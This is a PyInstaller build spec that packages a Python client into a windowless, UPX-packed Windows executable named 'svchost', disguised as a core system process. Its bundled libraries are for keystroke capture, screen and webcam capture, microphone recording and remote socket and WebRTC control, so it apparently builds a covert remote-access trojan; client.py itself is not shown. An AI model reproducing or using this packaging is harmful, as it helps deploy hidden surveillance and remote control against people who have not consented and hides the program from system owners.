# -*- mode: python ; coding: utf-8 -*-
"""
PyInstaller spec file for compiling client.py to svchost.exe
- Silent execution (no console window)
- All dependencies bundled
- Optimized for Windows deployment
"""

import sys
import os
from PyInstaller.utils.hooks import collect_all, collect_submodules

block_cipher = None

# Collect all necessary packages and their data files
datas = []
binaries = []
hiddenimports = []

# Core packages with submodules
packages_to_collect = [
    'socketio',
    'engineio',
    'websockets',
    'eventlet',
    'aiohttp',
    'aiofiles',
    'requests',
    'urllib3',
    'mss',
    'cv2',
    'numpy',
    'PIL',
    'pynput',
    'keyboard',
    'pyautogui',
    'psutil',
    'cryptography',
    'msgpack',
    'lz4',
    'zstandard',
    'xxhash',
    'aiortc',
]

# Windows-specific packages
if sys.platform == 'win32':
    packages_to_collect.extend([
        'dxcam',
        'pyaudio',
        'win32api',
        'win32con',
        'win32file',
        'win32gui',
        'win32process',
        'win32security',
        'win32service',
        'win32com',
        'pywintypes',
        'winreg',
    ])

# Collect all data, binaries, and hidden imports for each package
for package in packages_to_collect:
    try:
        pkg_datas, pkg_binaries, pkg_hiddenimports = collect_all(package)
        datas += pkg_datas
        binaries += pkg_binaries
        hiddenimports += pkg_hiddenimports
    except Exception as e:
        print(f"Warning: Could not collect {package}: {e}")
        # Add basic hidden import anyway
        hiddenimports.append(package)

# Additional hidden imports that might be dynamically loaded
additional_hiddenimports = [
    'dns',
    'dns.resolver',
    'dns.rdtypes',
    'dns.rdatatype',
    'SpeechRecognition',
    'pygame',
    'py_cpuinfo',
    'setuptools',
    'pkg_resources',
    'pkg_resources.py2_warn',
    'turbojpeg',
    'sounddevice',
    'cffi',
    'greenlet',
    'greenlet._greenlet',
    '_cffi_backend',
]

hiddenimports.extend(additional_hiddenimports)

# Remove duplicates
hiddenimports = list(set(hiddenimports))

a = Analysis(
    ['client.py'],
    pathex=[],
    binaries=binaries,
    datas=datas,
    hiddenimports=hiddenimports,
    hookspath=[],
    hooksconfig={},
    runtime_hooks=[],
    excludes=[
        'matplotlib',
        'pandas',
        'scipy',
        'PyQt5',
        'PyQt6',
        'tkinter',
        'test',
        'unittest',
        'distutils',
    ],
    win_no_prefer_redirects=False,
    win_private_assemblies=False,
    cipher=block_cipher,
    noarchive=False,
)

pyz = PYZ(a.pure, a.zipped_data, cipher=block_cipher)

exe = EXE(
    pyz,
    a.scripts,
    a.binaries,
    a.zipfiles,
    a.datas,
    [],
    name='svchost',
    debug=False,
    bootloader_ignore_signals=False,
    strip=False,
    upx=True,
    upx_exclude=[],
    runtime_tmpdir=None,
    console=False,  # NO CONSOLE WINDOW - Silent execution
    disable_windowed_traceback=False,
    argv_emulation=False,
    target_arch=None,
    codesign_identity=None,
    entitlements_file=None,
    icon=None,
    uac_admin=False,  # Do not request admin on launch
    uac_uiaccess=False,
)
